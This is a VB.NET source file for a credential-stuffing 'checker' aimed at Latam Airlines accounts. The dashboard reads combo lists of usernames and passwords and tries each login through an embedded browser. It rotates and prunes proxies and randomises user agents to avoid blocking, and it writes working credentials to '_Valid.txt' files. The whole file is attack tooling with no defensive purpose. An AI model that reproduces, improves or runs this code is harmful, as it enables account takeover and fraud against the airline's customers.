Imports System.IO
Imports Checker.SDK
Imports WinForm.UI.Controls
Imports WinForm.UI.Extension
Imports WinForm.UI.Forms

Public Class Dashboard

#Region " Constructor "

    Public Sub New()
        SetStyle(ControlStyles.SupportsTransparentBackColor, True)
        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.
        Me.BackColor = Color.Transparent
    End Sub

#End Region

#Region " Declare "
    Public Property ProxyList As New List(Of Proxy)
#End Region

    Private Sub Dashboard_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        For Each tstEnum As EO.Base.ProxyType In System.Enum.GetValues(GetType(EO.Base.ProxyType))
            Guna2ComboBox1.Items.Add(tstEnum.ToString)
        Next
        Guna2ComboBox1.SelectedIndex = 0

    End Sub

#Region " Selectors "

    Private Sub Guna2TextBox1_Click(sender As Object, e As EventArgs) Handles Guna2TextBox1.Click
        If OpenFileDialog1.ShowDialog = DialogResult.OK Then
            Guna2TextBox1.Text = OpenFileDialog1.FileName
            Guna2Panel2.Visible = True
            Me.ActiveControl = Nothing
        End If
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs) Handles Guna2Button4.Click

        If OpenFileDialog1.ShowDialog = DialogResult.OK Then
            ProxyCount.Text = 0
            ProxyList.Clear()
            ProxyConfig(False)
            Try
                Dim Delimiter As String = Guna2TextBox2.Text
                For Each Line As String In File.ReadLines(OpenFileDialog1.FileName)
                    Dim ProxyEx As Proxy = Proxy.Parse(Line, Delimiter)
                    If ProxyEx IsNot Nothing Then
                        ProxyList.Add(ProxyEx)
                        ProxyCount.Text += 1
                        Threading.Thread.Sleep(5)
                        Application.DoEvents()
                    End If
                Next
                If ProxyList.Count = 0 Then
                Guna2MessageDialog1.Icon = Guna.UI2.WinForms.MessageDialogIcon.Information
                Guna2MessageDialog1.Parent = Me.ParentForm
                Guna2MessageDialog1.Show("0 Proxies have been detected, please verify.", "Latam Airlines")
                Else
                    UseProxy.Checked = True
                End If
                ProxyCount.Text = ProxyList.Count
                ProxyConfig(True)
            Catch ex As Exception
                Guna2MessageDialog1.Icon = Guna.UI2.WinForms.MessageDialogIcon.Information
                Guna2MessageDialog1.Parent = Me.ParentForm
                Guna2MessageDialog1.Show(ex.Message, "Latam Airlines")
            End Try
        End If

    End Sub

    Private Sub ProxyConfig(ByVal Enabled As Boolean)
        Guna2Button4.Enabled = Enabled
        Guna2TextBox2.Enabled = Enabled
        Guna2ComboBox1.Enabled = Enabled
    End Sub

    Private ProxyT As EO.Base.ProxyType = EO.Base.ProxyType.HTTP

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        Guna2Button1.Enabled = False
        InvalidLabel.Text = 0
        ValidLabel.Text = 0
        AcoountCount.Text = 0
        Table1.DataSource = Nothing


        System.Threading.Thread.Sleep(500)

        ProxyT = SDK.Proxy.GetProxyTypeByIndex(Guna2ComboBox1.SelectedIndex)

        Dim FileCombo As String = Guna2TextBox1.Text
        Dim Delimiter As String = Guna2TextBox3.Text


        StartChecker(FileCombo, Delimiter)

        Guna2Button3.Enabled = True
    End Sub

#End Region

#Region " Checker "

    Private IsCancel As Boolean = False


    Private Sub StartChecker(ByVal FileCombo As String, ByVal Delimiter As String)
        Dim Asynctask As New Task(New Action(Async Sub()
                                                 Dim Rand As Random = New Random
                                                 Dim ProxyRotator As ProxyRotator = New ProxyRotator(ProxyList)
                                                 Dim ResPath As String = IO.Path.Combine(IO.Path.GetDirectoryName(FileCombo), IO.Path.GetFileNameWithoutExtension(FileCombo))

                                                 If File.Exists(FileCombo) Then
                                                     Dim AccListVerify As List(Of TradeViewModel) = New List(Of TradeViewModel)()
                                                     Dim ChangeProxy As Boolean = False

                                                     Dim SelectedProxy As Proxy = Nothing
                                                     Dim Proxy As EO.Base.ProxyInfo = Nothing


                                                     For Each Line As String In File.ReadLines(FileCombo)

                                                         Try
renew:
                                                             Dim RemoveBadProxys As Boolean = Guna2CheckBox1.Checked

                                                             If IsCancel = True Then
                                                                 IsCancel = False
                                                                 Exit For
                                                             End If

                                                             Dim LatamAcc As API.Models.Account = API.Models.Account.Parse(Line, Delimiter)

                                                             If LatamAcc IsNot Nothing Then

                                                                 If ChangeProxy = True AndAlso UseProxy.Checked = True AndAlso ProxyList.Count > 0 Then
                                                                     ChangeProxy = False

                                                                     If RemoveBadProxys = True AndAlso SelectedProxy IsNot Nothing Then
                                                                         ProxyRotator.Proxies.Remove(SelectedProxy)
                                                                         Me.BeginInvoke(Sub()
                                                                                            ProxyCount.Text = ProxyRotator.Proxies.Count
                                                                                        End Sub)
                                                                         Console.WriteLine(String.Format("Remove Bad Proxy : {0}", SelectedProxy.ToString))
                                                                     End If

                                                                     SelectedProxy = ProxyRotator.GetNextProxy

                                                                     If SelectedProxy.Type = Nothing Then
                                                                         SelectedProxy.Type = ProxyT
                                                                     End If

                                                                     Console.WriteLine("ProxyChanged : " & SelectedProxy.Type.ToString & "://" & SelectedProxy.IP & ":" & SelectedProxy.Port)
                                                                     Proxy = New EO.Base.ProxyInfo(SelectedProxy.Type, SelectedProxy.IP, SelectedProxy.Port)
                                                                 End If

                                                                 Dim InstanceID As String = LatamAcc.Username & Rand.Next(0, 9999) 'Core.Utils.StringToHex(LatamAcc.Username)
                                                                 Dim JsBoost As Boolean = Program.Settings.ReadIni("Config", "JsBoost", False)
                                                                 Dim LatamAirlines_Auth As API.Auth = New API.Auth(InstanceID, Proxy) With {.UseRandomUserAgent = True, .Secure = Not JsBoost}

                                                                 Me.BeginInvoke(Sub()
                                                                                    Panel1.Controls.Clear()
                                                                                    Panel1.Controls.Add(LatamAirlines_Auth.WebView)
                                                                                    LatamAirlines_Auth.WebViewHost.ZoomFactor = 0.5
                                                                                End Sub)

                                                                 Dim CheckLogin As API.Models.AuthResult = Await LatamAirlines_Auth.Login(LatamAcc)

                                                                 If CheckLogin.Status = -1 Or CheckLogin.RequiredProxyChanged = True Then
                                                                     LatamAirlines_Auth.Dispose()
                                                                     ChangeProxy = True
                                                                     GoTo renew
                                                                 End If


                                                                 If CheckLogin.IsUserValid = True Then
                                                                     Try
                                                                         Using StreamUserValid As StreamWriter = New StreamWriter(ResPath & "_UserValid.txt", True)
                                                                             StreamUserValid.WriteLine(String.Format("{0}{1}{2}", LatamAcc.Username, Delimiter, LatamAcc.Password))
                                                                         End Using
                                                                     Catch ex As Exception
                                                                         Console.WriteLine("Write error : " & ex.Message)
                                                                     End Try
                                                                 End If

                                                                 Dim AccountResult As TradeViewModel = New TradeViewModel() With {
                       .User = LatamAcc.Username,
                       .Pass = LatamAcc.Password,
                       .Result = CheckLogin.IsAlive,
                       .Msg = CheckLogin.Status & "=" & CheckLogin.ErrorMessage
                   }


                                                                 AccListVerify.Add(AccountResult)
                                                                 Me.BeginInvoke(Sub()
                                                                                    AcoountCount.Text += 1

                                                                                    If AccountResult.Result = True Then

                                                                                        Try
                                                                                            Using StreamValid As StreamWriter = New StreamWriter(ResPath & "_Valid.txt", True)
                                                                                                StreamValid.WriteLine(String.Format("{0}{1}{2}", LatamAcc.Username, Delimiter, LatamAcc.Password))
                                                                                            End Using
                                                                                        Catch ex As Exception
                                                                                            Console.WriteLine("Write error : " & ex.Message)
                                                                                        End Try

                                                                                        ValidLabel.Text += 1
                                                                                    Else
                                                                                        '  StreamInvalid.WriteLine(String.Format("{0}{1}{2}", LatamAcc.Username, Delimiter, LatamAcc.Password))
                                                                                        InvalidLabel.Text += 1
                                                                                    End If
                                                                                    Table1.DataSource = AccListVerify
                                                                                    LatamAirlines_Auth.Dispose()
                                                                                End Sub)

                                                             End If

                                                         Catch ex As Exception

                                                         End Try

                                                     Next
                                                 End If

                                                 Me.BeginInvoke(Sub()
                                                                    Panel1.Controls.Clear()
                                                                    Guna2Button3.Enabled = True
                                                                    Guna2Button1.Enabled = True
                                                                End Sub)

                                             End Sub), TaskCreationOptions.LongRunning)
        Asynctask.Start()
    End Sub



    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        Guna2Button3.Enabled = False
        IsCancel = True
    End Sub

    Public NotInheritable Class TradeViewModel
        Public Property User As String
        Public Property Pass As String
        Public Property Result As String
        Public Property Msg As String
    End Class




#End Region

End Class
